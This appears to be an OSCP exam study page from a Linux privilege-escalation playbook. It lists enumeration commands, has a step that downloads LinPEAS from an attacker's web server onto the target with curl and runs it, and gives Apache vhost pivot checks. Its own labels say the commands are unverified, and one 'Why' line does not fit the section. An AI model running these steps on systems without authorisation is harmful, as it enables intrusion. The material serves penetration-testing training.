# Linux - Local Enum

**Step 13 of 50 · Linux**

*Identify the user, host, kernel, and the local privilege paths available from the shell.*

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.

Run the identity checks first, then transfer and run LinPEAS, a local-enumeration script that highlights common privilege-escalation paths. Use this after a shell is stable; the results tell you which focused page to open next.

```bash
whoami
id
hostname
uname -a
curl http://$LocalIP:$WebPort/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

## Example output

 > *Example shape only: the LinPEAS transfer command is not yet verified against a real box.*
```
uid=1000(username) gid=1000(username) groups=1000(username)
Linux host 5.x x86_64
[+] Sudoers file: /etc/sudoers
...
```
## What did you get?

- [ ] Sudo rights are found → **Go to Step 14 · [[Linux - Sudo Check]]**
- [ ] SUID files are found → **Go to Step 15 · [[Linux - SUID Check]]**
- [ ] Root cron jobs or writable scripts are found → **Go to Step 16 · [[Linux - Cron Check]]**
- [ ] A writable service is found → **Run `systemctl cat $ServiceName` and `ls -la $ServicePath`, then go to Step 10 · [[Linux - Exploit Search]] if the service file or binary is writable**
- [ ] Credentials appear in files → **Go to Step 17 · [[Linux - Credential Search]]**
- [ ] A kernel exploit candidate is shown → **Go to Step 19 · [[Linux - Kernel Exploit]]**
- [ ] Nothing useful is found → **Go to Step 17 · [[Linux - Credential Search]]**

## Notes

Start the Kali helper web server with `transfer` or `www` before downloading, and use the port it prints. `$WebPort` is the target web port, not automatically the Kali server port.

## Gotcha

> [!warning] 💡
> The exact LinPEAS transfer command varies by shell and target tools. Confirm the available downloader before using it.

> [!warning]
> Command not yet verified against a real box. Confirm the exact `wget` transfer and LinPEAS execution syntax before relying on it in an exam.

## Loopback service and Apache vhost pivot

When a listener appears on `127.0.0.1`, inspect Apache's enabled virtual hosts before attempting external access. A vhost can reveal the document root and an `AssignUserID` directive, which identifies the account that executes the internal application.

> **Why:** These commands connect the loopback port to its Apache configuration and expose the service's execution user and writable files.
```bash
ss -lntp
ls /etc/apache2/sites-enabled/
cat /etc/apache2/sites-enabled/internal.conf
ls -la /var/www/internal/
```

> [!warning] 💡
> If the current user owns the internal web root, check the PHP source before trying to brute-force a session-protected login. Rewriting an owned page may be the intended pivot.
## Seen in
- *(no write-up yet)*
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- identity checks led to sudo enumeration
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- ONA config, loopback listeners, and Apache vhost exposed credential and pivot paths

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
